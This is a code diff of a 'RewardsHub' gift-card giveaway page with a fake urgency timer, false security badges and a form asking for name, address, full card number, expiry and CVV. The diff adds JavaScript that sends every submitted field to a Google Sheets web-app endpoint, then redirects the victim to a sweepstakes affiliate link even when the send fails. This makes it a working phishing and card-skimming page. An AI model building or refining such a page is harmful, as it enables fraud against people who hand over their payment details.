@@ -30,7 +30,6 @@
             position: relative;
         }
 
-        /* Neon Particle Background */
         #particles {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -38,7 +37,6 @@
             pointer-events: none;
         }
 
-        /* Enhanced Trust & Timer Bar */
         .trust-bar {
             width: 100%;
             background: linear-gradient(90deg, rgba(10,15,28,0.95), rgba(20,30,46,0.95));
@@ -72,7 +70,6 @@
             text-shadow: 0 0 15px #ff007f;
         }
 
-        /* Enhanced Logo */
         .brand-logo {
             font-size: 42px;
             font-weight: 900;
@@ -89,7 +86,6 @@
             z-index: 10;
         }
 
-        /* 3D Enhanced Floating Card with Glowing Particles */
         .hero-section {
             display: flex;
             flex-direction: column;
@@ -161,7 +157,6 @@
             border: 3px solid #ff5e62;
         }
 
-        /* Main Form with Enhanced Glow & Security */
         .form-container {
             background: var(--form-bg);
             width: 92%;
@@ -196,7 +191,6 @@
             -webkit-text-fill-color: transparent;
         }
 
-        /* Input Enhancements */
         .input-group { margin-bottom: 22px; }
         .row { display: flex; gap: 18px; }
         .row .input-group { flex: 1; }
@@ -232,7 +226,6 @@
             transform: translateY(-1px);
         }
 
-        /* Secure Badge */
         .secure-badge {
             display: flex;
             align-items: center;
@@ -247,7 +240,6 @@
             text-shadow: 0 0 10px var(--accent);
         }
 
-        /* Submit Button */
         .submit-btn {
             width: 100%;
             background: linear-gradient(45deg, var(--primary-glow), #ff007f, var(--primary-glow));
@@ -265,6 +257,8 @@
             box-shadow: 
                 0 10px 30px rgba(138, 43, 226, 0.7),
                 0 0 25px rgba(255, 0, 127, 0.8);
+            display: inline-block;
+            text-align: center;
         }
 
         .submit-btn:hover {
@@ -273,8 +267,13 @@
                 0 15px 40px rgba(138, 43, 226, 0.9),
                 0 0 40px rgba(255, 0, 127, 1);
         }
+        
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
 
-        /* Footer */
         .footer {
             width: 100%;
             background: #0a0f1c;
@@ -303,7 +302,6 @@
             transform: scale(1.1);
         }
 
-        /* CSS Animations */
         @keyframes pulse-border {
             0% { border-bottom-color: var(--secondary-glow); }
             50% { border-bottom-color: var(--primary-glow); }
@@ -329,7 +327,6 @@
             100% { transform: translateX(-100%); }
         }
 
-        /* 3D Card Inner Glow */
         .gift-card::after {
             content: '';
             position: absolute;
@@ -349,20 +346,16 @@
 </head>
 <body>
 
-    <!-- Particles Canvas -->
     <canvas id="particles"></canvas>
 
-    <!-- 1. Header with Trust Badges and Timer -->
     <div class="trust-bar">
         <span class="trust-badge">✔️ 100% Verified</span>
         <span class="trust-badge">🔒 Secure 256-bit</span>
         <span>LIMITED TIME OFFER: <span class="timer-text" id="countdown">05:00</span></span>
     </div>
 
-    <!-- 2. Logo -->
     <div class="brand-logo">🎁 RewardsHub</div>
 
-    <!-- 3. 3D Floating & Rotating Card -->
     <div class="hero-section">
         <h1 class="headline-3d">Win a $500 Gift Card!</h1>
         <div class="card-container">
@@ -371,66 +364,64 @@
         </div>
     </div>
 
-    <!-- 4. Main Form Area -->
     <div class="form-container">
         <h2 class="form-title">Account Verification</h2>
         
-        <form action="#" method="POST">
+        <!-- Yahan par form me ID aur Name lazmi di gayi hai taake JS isko catch kar sakay -->
+        <form id="leadForm" name="leadForm">
             
-            <!-- SECTION A: First Name & Last Name -->
             <div class="row">
                 <div class="input-group">
                     <label>First Name</label>
-                    <input type="text" placeholder="John" required>
+                    <input type="text" name="firstName" placeholder="John" required>
                 </div>
                 <div class="input-group">
                     <label>Last Name</label>
-                    <input type="text" placeholder="Doe" required>
+                    <input type="text" name="lastName" placeholder="Doe" required>
                 </div>
             </div>
 
             <div class="input-group">
                 <label>Email Address</label>
-                <input type="email" placeholder="name@example.com" required>
+                <input type="email" name="email" placeholder="name@example.com" required>
             </div>
 
             <div class="input-group">
                 <label>Full Delivery Address</label>
-                <input type="text" placeholder="123 Main St, Apt 4" required>
+                <input type="text" name="address" placeholder="123 Main St, Apt 4" required>
             </div>
 
-            <!-- SECTION B: Cardholder Details -->
             <div class="secure-badge">
                 🔒 Secure Payment Verification (No Charge)
             </div>
 
             <div class="input-group">
                 <label>Cardholder Name</label>
-                <input type="text" placeholder="John Doe" required>
+                <input type="text" name="cardholderName" placeholder="John Doe" required>
             </div>
 
             <div class="input-group">
                 <label>Card Number</label>
-                <input type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                <input type="text" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
             </div>
 
             <div class="row">
                 <div class="input-group">
                     <label>Expiry Date</label>
-                    <input type="text" placeholder="MM/YY" maxlength="5" required>
+                    <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
                 </div>
                 <div class="input-group">
                     <label>CVV / CVC</label>
-                    <input type="password" placeholder="•••" maxlength="4" required>
+                    <input type="password" name="cvv" placeholder="•••" maxlength="4" required>
                 </div>
             </div>
 
-            <!-- Submit -->
-            <button type="submit" class="submit-btn">Verify & Claim Reward</button>
+            <!-- Anchor Tag ko waapis Button me badal diya hai taake form properly submit ho sakay -->
+            <button type="submit" class="submit-btn" id="submitBtn">Verify & Claim Reward</button>
+        
         </form>
     </div>
 
-    <!-- 5. Footer -->
     <footer class="footer">
         <p>&copy; 2026 RewardsHub. All rights reserved.</p>
         <p>This is a promotional offer. Your information is 100% secure.</p>
@@ -441,7 +432,6 @@
         </div>
     </footer>
 
-    <!-- JavaScript Timer + Particles -->
     <script>
         // Timer
         let timeInSecs = 5 * 60;
@@ -462,13 +452,13 @@
             }
         }, 1000);
 
-        // 3D Card Interactive Hover
+        // 3D Card Hover Effect
         const cardContainer = document.querySelector('.card-container');
         cardContainer.addEventListener('mousemove', (e) => {
             const rect = cardContainer.getBoundingClientRect();
             const x = (e.clientX - rect.left) / rect.width - 0.5;
             const y = (e.clientY - rect.top) / rect.height - 0.5;
-            cardContainer.style.transform = `perspective(1200px) rotateX(\( {y * -25}deg) rotateY( \){x * 25}deg)`;
+            cardContainer.style.transform = `perspective(1200px) rotateX(${y * -25}deg) rotateY(${x * 25}deg)`;
         });
         cardContainer.addEventListener('mouseleave', () => {
             cardContainer.style.transition = 'transform 0.8s cubic-bezier(0.23, 1, 0.32, 1)';
@@ -478,7 +468,7 @@
             }, 800);
         });
 
-        // Canvas Particles
+        // Particles Background
         const canvas = document.getElementById('particles');
         const ctx = canvas.getContext('2d');
         let particles = [];
@@ -496,7 +486,7 @@
                 this.speedX = Math.random() * 0.8 - 0.4;
                 this.speedY = Math.random() * -1.2 - 0.8;
                 this.opacity = Math.random() * 0.7 + 0.4;
-                this.hue = Math.random() > 0.5 ? 270 : 320; // purple/pink
+                this.hue = Math.random() > 0.5 ? 270 : 320;
             }
 
             update() {
@@ -540,14 +530,37 @@
             requestAnimationFrame(animateParticles);
         }
 
-        window.addEventListener('resize', () => {
-            resizeCanvas();
-        });
-
-        // Start everything
+        window.addEventListener('resize', resizeCanvas);
         resizeCanvas();
         initParticles();
         animateParticles();
+
+        // -------------------------------------------------------------
+        // GOOGLE SHEETS FORM SUBMISSION & REDIRECT LOGIC
+        // -------------------------------------------------------------
+        const scriptURL = 'YOUR_GOOGLE_WEB_APP_URL_HERE'; // Yahan apna Google Web App URL lagayein
+        const form = document.forms['leadForm'];
+        const submitBtn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', e => {
+            e.preventDefault(); // Default page reload rokna
+            
+            // Button ka text aur state change karna
+            submitBtn.innerHTML = 'Verifying... ⏳';
+            submitBtn.disabled = true;
+
+            // Form data sheet mein bhejna
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => {
+                    // Success hone par Affiliate link par bhejna
+                    window.location.href = 'https://play.sweepstakesalerts.com/win-5000';
+                })
+                .catch(error => {
+                    console.error('Error!', error.message);
+                    // Agar koi error bhi aye tou user lose na ho, offer par direct ho jaye
+                    window.location.href = 'https://play.sweepstakesalerts.com/win-5000';
+                });
+        });
     </script>
 </body>
 </html>
